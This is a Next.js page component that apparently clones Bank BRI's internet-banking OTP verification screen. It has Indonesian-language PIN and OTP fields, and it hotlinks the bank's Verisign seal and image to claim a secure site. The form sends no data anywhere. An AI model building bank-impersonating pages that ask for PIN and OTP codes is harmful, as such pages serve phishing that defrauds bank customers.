import React from 'react'
import Footer from '../components/footer'
import { useRouter } from 'next/router'
import Navbar from '../components/navbar'
import Contents from '../components/contents'

export default function Otp() {
  const router = useRouter()
  const handleClick = () => router.push('/')
  return (
    <div>
        <Navbar />
        <div className='d-flex'>
          <div className="loginform-wrap my-5 me-3">
            <form className="loginform">
            <h2>Verifikasi</h2>
            <input name="userId" autoComplete="off" maxLength={23} type="text" placeholder="PIN" style={{marginBottom: '5px'}} form="loginform" />
            <input name="userId" autoComplete="off" maxLength={23} type="text" placeholder="OTP" style={{marginBottom: '5px'}} form="loginform" />
              <button type="button" onClick={handleClick}>Masuk</button>
              <div style={{float: 'left', width : '100%'}}>
                <a href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=ib.bri.co.id" className="verisign">
                  <img className="verisign-logo" src="https://ib.bri.co.id/ib-bri/img/securesite1rtc.jpg" width="100px" height="55px" />
                </a>
                <div className="verisigntext">This site chose Verisign SSL for secure e-commerce and confidential communications 
                </div>
              </div>
            </form>

          </div>
          <Contents/>
        </div>
        <Footer/>
    </div>
  )
}
